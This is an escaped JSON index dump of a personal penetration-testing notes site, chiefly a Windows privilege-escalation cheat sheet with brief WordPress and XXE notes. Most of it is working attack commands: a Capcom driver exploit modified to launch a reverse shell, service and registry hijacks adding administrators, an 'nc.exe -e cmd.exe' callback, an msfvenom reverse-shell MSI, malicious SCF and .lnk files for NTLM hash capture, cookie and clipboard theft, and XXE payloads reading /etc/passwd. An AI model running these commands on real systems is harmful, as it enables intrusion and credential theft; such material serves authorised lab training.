\u0026#34;\\??\\C:\\Tools\\Capcom.sys\u0026#34; reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1\rDownload DriverView: http://www.nirsoft.net/utils/driverview.html\rVerify Capcom Driver is Listed: PS C:\\htb\u0026gt; .\\DriverView.exe /stext drivers.txt PS C:\\htb\u0026gt; cat drivers.txt | Select-String -pattern Capcom\rExploit\nDownload Exploit: https://github.com/musheebat/Compiled-capcom-exploit/blob/main/ExploitCapcom.exe https://github.com/tandasat/ExploitCapcom\rUse ExploitCapcom : PS C:\\htb\u0026gt; .\\ExploitCapcom.exe\r**Alternate Exploitation - No GUI **\nIf we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace \u0026quot;C:\\\\Windows\\\\system32\\\\cmd.exe\u0026quot; with, say, a reverse shell binary created with msfvenom, for example: c:\\ProgramData\\revshell.exe.\n// Launches a command shell process static bool LaunchShell() { TCHAR CommandLine[] = TEXT(\u0026#34;C:\\\\Windows\\\\system32\\\\cmd.exe\u0026#34;); PROCESS_INFORMATION ProcessInfo; STARTUPINFO StartupInfo = { sizeof(StartupInfo) }; if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, \u0026amp;StartupInfo, \u0026amp;ProcessInfo)) { return false; } CloseHandle(ProcessInfo.hThread); CloseHandle(ProcessInfo.hProcess); return true; }\rThe CommandLine string in this example would be changed to:\nTCHAR CommandLine[] = TEXT(\u0026#34;C:\\\\ProgramData\\\\revshell.exe\u0026#34;);\rAutomating the Steps\nWe can use a tool such as EoPLoadDriver to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver. To do this, we would run the following\nDownload EoPLoadDriver : wget https://github.com/TarlogicSecurity/EoPLoadDriver/\rUse EoPLoadDriver : EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys\rWe would then run ExploitCapcom.exe to pop a SYSTEM shell or run our custom binary.\nServer Operators #Print_Operators\nConfirming service starts : sc qc AppReadiness\rDownload Psservice : wget https://learn.microsoft.com/en-us/sysinternals/downloads/psservice\rChecking Service Permissions : c:\\Tools\\PsService.exe security AppReadiness\rModifying the Service Binary Path sc config AppReadiness binPath= \u0026#34;cmd /c net localgroup Administrators server_adm /add\u0026#34;\rRetrieve Credential : crackmapexec smb 10.129.43.9 -u server_adm -p \u0026#39;HTB_@cademy_stdnt!\u0026#39; secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator\rOS Exploitation User Account Control #UAC\nConfirming UAC is Enabled : REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA\rChecking UAC Level : REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin\rIf 0 then, UAC won\u0026rsquo;t prompt (like disabled)\nIf 1 the admin is asked for username and password to execute the binary with high rights (on Secure Desktop)\nIf 2 (Always notify me) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)\nIf 3 like 1 but not necessary on Secure Desktop\nIf 4 like 2 but not necessary on Secure Desktop\nif 5(default) it will ask the administrator to confirm to run non Windows binaries with high privileges\nChecking Windows Version\n[environment]::OSVersion.Version\rRessources : https://en.wikipedia.org/wiki/Windows_10_version_history https://egre55.github.io/system-properties-uac-bypass/ Weak Permissions #Weak_Permissions\nWeak Binary Permissions\nDownload SharpUp : wget https://github.com/GhostPack/SharpUp/\rRun SharpUp : .\\SharpUp.exe audit\rOR\nRun Powerup : iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1 powershell -ep bypass .\\PowerUp.ps1 Get-ModifiableServiceFile\rChecking BInary Permissions : icacls \u0026#34;C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\u0026#34;\rList running binary : Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like \u0026#39;Running\u0026#39;}\rThe icacls utility outputs the corresponding principals and their permission mask. The most relevant permissions and their masks are listed below:\nMask Permissions :\nF : Full access M : Modify access RX : Read and execute access R : Read-only access W : Write-only access\nCheck the startup status of the binary : Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like \u0026#39;mysql\u0026#39;} #mysql is the name !\rReboot the machine : shutdown /r /t 0\rReplacing Service Binary cmd /c copy /Y SecurityService.exe \u0026#34;C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\u0026#34; #then start the service sc start SecurityService\rWeak Service Permissions\nDownload Accesschk : wget https://download.sysinternals.com/files/AccessChk.zip\rChecking Permissions : accesschk.exe /accepteula -quvcw WindscribeService\rChanging the Service Binary Path : sc config WindscribeService binpath=\u0026#34;cmd /c net localgroup administrators htb-student /add\u0026#34;\rSearching for Unquoted Service Paths\nQuerying Service : sc qc SystemExplorerHelpService\rSearching for Unquoted Service Paths : wmic service get name,displayname,pathname,startmode |findstr /i \u0026#34;auto\u0026#34; | findstr /i /v \u0026#34;c:\\windows\\\\\u0026#34; | findstr /i /v \u0026#34;\u0026#34;\u0026#34;\rPermissive Registry ACLs\nChecking for Weak Service ACLs in Registry : accesschk.exe /accepteula \u0026#34;mrb3n\u0026#34; -kvuqsw hklm\\System\\CurrentControlSet\\services\rChanging ImagePath with PowerShell : Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ModelManagerService -Name \u0026#34;ImagePath\u0026#34; -Value \u0026#34;C:\\Users\\john\\Downloads\\nc.exe -e cmd.exe 10.10.10.205 443\u0026#34;\rModifiable Registry Autorun Binary\nCheck Startup Programs : Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl\rRessources : https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries Kernel Exploits #Kernel_Exploits\nEscalation with Metasploit\nAfter Metrepreter run post/multi/recon/local_exploit_suggester Manual Kernel Exploitation\nIn windows PS systeminfo Copy the data from above commands. In attacker machine Save the data in a text file windows-exploit-suggester.py --database \u0026lt;db-date\u0026gt;.xlsx --systeminfo systeminfo.txt Checking Permissions on the SAM File\nicacls c:\\Windows\\System32\\config\\SAM\rEnumerating Missing Patches\nExamining Installed Updates: systeminfo wmic qfe list brief Get-Hotfix\rRessources : https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808 Vulnerable Services #Vulnerable_Services\nEnumerating Installed Programs : wmic product get name\rEnumerating Local Ports : netstat -ano | findstr 6064\rEnumerating Process ID get-process -Id 3324\rEnumerating Running Service get-service | ? {$_.DisplayName -like \u0026#39;Druva*\u0026#39;}\rDLL Injection #dll\nLoadLibrary:\nManual Mapping:\nReflective DLL Injection : https://github.com/stephenfewer/ReflectiveDLLInjection\nDLL Hijacking:\nThe following listing shows the standard search order taken from the Microsoft Documentation:\nThe directory from which the application loaded. The system directory. The 16-bit system directory. The Windows directory. The current directory. The directories that are listed in the PATH environment variable. Additional Techniques #Additional_Technique\nInteracting with Users Monitoring for Process Command Lines\nCreating procmon.ps1 : while($true) { $process = Get-WmiObject Win32_Process | Select-Object CommandLine Start-Sleep 1 $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine Compare-Object -ReferenceObject $process -DifferenceObject $process2 }\rRunning Monitor Script : IEX (iwr \u0026#39;http://10.10.10.205/procmon.ps1\u0026#39;) Tools to analyse Traffic : https://github.com/DanMcInerney/net-creds SCF on a File Share\nA Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as Responder, Inveigh, or InveighZero, we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user\u0026rsquo;s workstation. We may be able to capture a user\u0026rsquo;s password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.\nMalicious SCF File\nIn this example, let\u0026rsquo;s create the following file and name it something like @Inventory.scf (similar to another file in the directory, so it does not appear out of place). We put an @ at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our tun0 IP address and any fake share name and .ico file name.\nMalicious file : [Shell] Command=2 IconFile=\\\\10.10.14.3\\share\\legit.ico [Taskbar] Command=ToggleDesktop\rStarting Responder\nNext, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user\u0026rsquo;s NTLMV2 password hash in our console and attempt to crack it offline.\nListening : p4v1c@htb[/htb]$ sudo responder -wrf -v -I tun0 [+] Listening for events... [SMB] NTLMv2-SSP Client : 10.129.43.30 [SMB] NTLMv2-SSP Username : WINLPE-SRV01\\Administrator [SMB] NTLMv2-SSP Hash : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...\u0026lt;SNIP\u0026gt;...\rTools to listen : https://github.com/lgandx/Responder https://github.com/Kevin-Robertson/Inveigh https://github.com/Kevin-Robertson/InveighZero Capturing Hashes with a Malicious .lnk File\nThis attack no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file. We can use various tools to generate a malicious .lnk file, such as Lnkbomb, as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:\nGenerating a Malicious .lnk File $objShell = New-Object -ComObject WScript.Shell $lnk = $objShell.CreateShortcut(\u0026#34;C:\\legit.lnk\u0026#34;) $lnk.TargetPath = \u0026#34;\\\\\u0026lt;attackerIP\u0026gt;\\@pwn.png\u0026#34; $lnk.WindowStyle = 1 $lnk.IconLocation = \u0026#34;%windir%\\system32\\shell32.dll, 3\u0026#34; $lnk.Description = \u0026#34;Browsing to the directory where this file is saved will trigger an auth request.\u0026#34; $lnk.HotKey = \u0026#34;Ctrl+Alt+O\u0026#34; $lnk.Save()\rPillaging Data Sources\nBelow are some of the sources from which we can obtain information from compromised systems:\nInstalled applications Installed services Websites File Shares Databases Directory Services (such as Active Directory, Azure AD, etc.) Name Servers Deployment Services Certificate Authority Source Code Management Server Virtualization Messaging Monitoring and Logging Systems Backups Sensitive Data Keylogging Screen Capture Network Traffic Capture Previous Audit reports User Information History files, interesting documents (.doc/x,.xls/x,password./pass., etc) Roles and Privileges Web Browsers IM Clients Copy Firefox Cookies Database\ncopy $env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\cookies.sqlite .\rDownload CookieExtractor : wget https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py\rExtract website Cookie from Database : python3 cookieextractor.py --dbpath \u0026#34;/home/plaintext/cookies.sqlite\u0026#34; --host slack --cookie d\rClipboard\nDownload ClipboardLogger : wget https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1\rMonitor the Clipboard: Invoke-ClipboardLogger\rMiscellaneous Techniques Always Install Elevated\nEnumerating Always Install Elevated Settings : reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\rGenerating MSI Package msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi \u0026gt; aie.msi\rExecuting MSI Package: msiexec /i c:\\users\\htb-student\\desktop\\aie.msi /quiet /qn /norestart\rScheduled Tasks\nEnumerating Scheduled Tasks : schtasks /query /fo LIST /v schtasks /query /v /fo LIST \u0026gt; tasklist.txt\rSpeed Up the task : Get-ScheduledTask -TaskName \u0026#34;Daily_Checkup\u0026#34; | Start-ScheduledTask\rEnumerating Scheduled Tasks with powershell : Get-ScheduledTask | select TaskName,State\rUser/Computer Description Field\nChecking Local User Description Field: Get-LocalUser\rEnumerating Computer Description Field Get-WmiObject -Class Win32_OperatingSystem | select Description\rMount VHDX/VMDK\nMount VMDK on Linux guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk\rMount VHD/VHDX on Linux guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1\rRetrieving Hashes using Secretsdump.py secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL\rRessources Download Runas wget https://github.com/antonioCoco/RunasCs\rSwitch user cmd RunasCs.exe Administrator password \u0026#34;cmd /c whoami \u0026#34;\rBypass Powershell Policy Set-ExecutionPolicy Bypass -Scope Process\rCompiled Tools : https://github.com/r3motecontrol/Ghostpack-CompiledBinaries\nGrep on Windows :\ncat file.txt | Select-String password\rLiving Off The Land Binaries and Scripts (LOLBAS): https://lolbas-project.github.io/#\nTransferring File with Certutil :\ncertutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat\rEncoding File with Certutil : certutil -encode file1 encodedfile\rDecoding File with Certutil certutil -decode encodedfile file2\rRun DLL : rundll32 shell32.dll,Control_RunDLL C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll\r#Windows_Tools Some Automated Tools\nWinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation Sherlock - https://github.com/rasta-mouse/Sherlock Watson - https://github.com/rasta-mouse/Watson PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc JAWS - https://github.com/411Hall/JAWS Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/ https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpDPAPI.exe Seatbelt - https://github.com/GhostPack/Seatbelt Seatbelt.exe -group=all -full\rSharpUp - https://github.com/GhostPack/ Privesc Check https://github.com/itm4n/PrivescCheck cmd /c \u0026ldquo;curl http://10.8.3.12:8080/PrivescCheck.ps1 \u0026gt; PrivescCheck.ps1 \u0026quot;\n","date":"2023-09-07","id":115,"permalink":"/notes/ad/local-privilege-escalation/windows-privesc/","summary":"\u003ch3 id=\"information-gathering\"\u003eInformation Gathering\u003c/h3\u003e\n\u003cp\u003e#Windows_Enumeration\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eNetwork Information:\u003c/strong\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003earp\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eroute\u003c/span\u003e \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eList hidden file :\u003c/strong\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecmd /c dir /A\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eChange password of user\u003c/strong\u003e\u003c/p\u003e","tags":[],"title":"windows-privesc"},{"content":" User enumeration : curl https://rec-mesavantages-sociaux.int.sncf.fr/wp-json/wp/v2/users | jq -r \u0026#39;.[].slug\u0026#39;\r","date":"2023-09-07","id":116,"permalink":"/notes/web/wordpress/","summary":"\u003cul\u003e\n\u003cli\u003eUser enumeration :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl https://rec-mesavantages-sociaux.int.sncf.fr/wp-json/wp/v2/users \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq -r \u003cspan class=\"s1\"\u003e\u0026#39;.[].slug\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Wordpress"},{"content":"CSP ressources: https://csp-evaluator.withgoogle.com/\n","date":"2023-09-07","id":117,"permalink":"/notes/web/xss/","summary":"\u003cp\u003eCSP ressources:\nhttps://csp-evaluator.withgoogle.com/\u003c/p\u003e","tags":[],"title":"XSS"},{"content":" If in a request you have xml body like this : \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;381\u0026lt;/productId\u0026gt;\u0026lt;/stockCheck\u0026gt;\rYou can try this attack : \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;\u0026amp;xxe;\u0026lt;/productId\u0026gt;\u0026lt;/stockCheck\u0026gt;\rYou can also performed a SSRF : \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://internal.vulnerable-website.com/\u0026#34;\u0026gt; ]\u0026gt;\rXInclude (server-side XML) : productId=\u0026lt;foo xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u0026gt;\u0026lt;xi:include parse=\u0026#34;text\u0026#34; href=\u0026#34;file:///etc/passwd\u0026#34;/\u0026gt;\u0026lt;/foo\u0026gt;\u0026amp;storeId=1\rVia file upload that accepts SVG image : \u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY fetch SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;]\u0026gt; \u0026lt;svg width=\u0026#34;128px\u0026#34; height=\u0026#34;128px\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34; version=\u0026#34;1.1\u0026#34;\u0026gt; \u0026lt;text font-size=\u0026#34;23\u0026#34; x=\u0026#34;8\u0026#34; y=\u0026#34;28\u0026#34;\u0026gt;\u0026amp;fetch;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt;\rOR\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://5y4g40b6lcapqz14hupvgwkptgz7nxbm.oastify.com/\u0026#34; \u0026gt;]\u0026gt; \u0026lt;svg width=\u0026#34;128px\u0026#34; height=\u0026#34;128px\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34; version=\u0026#34;1.1\u0026#34;\u0026gt; \u0026lt;text font-size=\u0026#34;16\u0026#34; x=\u0026#34;0\u0026#34; y=\u0026#34;16\u0026#34;\u0026gt;\u0026amp;xxe;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt;\rContent-Type: From x-www-urlencoded to XML If a POST request accepts the data in XML format, you could try to exploit a XXE in that request. For example, if a normal request contains the following:\nPOST /action HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 7 foo=bar\rThen you might be able submit the following request, with the same result:\nPOST /action HTTP/1.0 Content-Type: text/xml Content-Length: 52 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;foo\u0026gt;bar\u0026lt;/foo\u0026gt;\r","date":"2023-09-07","id":118,"permalink":"/notes/web/xxe/","summary":"\u003cul\u003e\n\u003cli\u003eIf in a request you have \u003ccode\u003exml\u003c/code\u003e body  like this :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;\u003c/span\u003e381\u003cspan class=\"nt\"\u003e\u0026lt;/productId\u0026gt;\u0026lt;/stockCheck\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eYou can try this attack :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u003c/span\u003e \u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;\u003c/span\u003e ]\u0026gt; \u003cspan class=\"nt\"\u003e\u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;\u003c/span\u003e\u003cspan class=\"ni\"\u003e\u0026amp;xxe;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/productId\u0026gt;\u0026lt;/stockCheck\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eYou can also performed  a SSRF :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://internal.vulnerable-website.com/\u0026#34;\u0026gt;\u003c/span\u003e ]\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eXInclude (server-side XML) :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eproductId\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026lt;foo xmlns:xi\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;xi:include \u003cspan class=\"nv\"\u003eparse\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;file:///etc/passwd\u0026#34;\u003c/span\u003e/\u0026gt;\u0026lt;/foo\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003estoreId\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eVia file upload that accepts SVG image :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY fetch SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;\u003c/span\u003e]\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;svg\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;128px\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;128px\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2000/svg\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exmlns:xlink=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/1999/xlink\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003eversion=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;1.1\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;text\u003c/span\u003e \u003cspan class=\"na\"\u003efont-size=\u003c/span\u003e\u003cspan 